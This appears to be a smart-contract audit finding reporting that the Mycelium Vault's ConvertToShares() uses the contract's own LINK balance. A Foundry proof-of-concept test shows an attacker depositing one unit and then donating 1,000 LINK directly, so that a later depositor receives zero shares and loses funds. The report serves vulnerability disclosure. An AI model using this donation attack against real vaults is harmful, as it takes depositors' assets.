# ConvertToShares () uses the LINK of the contract to calculate and may result in a loss of user assets

## Summary
ConvertToShares () uses the LINK of the contract to calculate and may result in a loss of user assets
## Vulnerability Detail
ConvertToShares () uses the LINK of the contract to calculate and may result in a loss of user assets
## Impact
loss of user assets
## Code Snippet
https://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L614-L619

poc
1. The attacker sends the link to the Vault contract
2. Totalshares is inconsistent with TokenSupply
3. The result of ConvertoShares () is 0, and the user link is lost

```solidity
function testLoss() public {
    // hacker deposits
    link.mint(alice, 1001);
    vm.startPrank(alice);
    link.approve(address(vault), 1);
    vault.deposit(1);
    link.transfer(address(vault),1000);
    vm.stopPrank();

    // Bob deposits
    link.mint(bob, 1);
    vm.startPrank(bob);
    link.approve(address(vault), 1);
    vault.deposit(1);
    vm.stopPrank();

    assertEq(vault.balanceOf(bob),0);
    assertEq(link.balanceOf(bob),0);
}
```
## Tool used

Manual Review

## Recommendation
The contract itself link is not used as the calculation
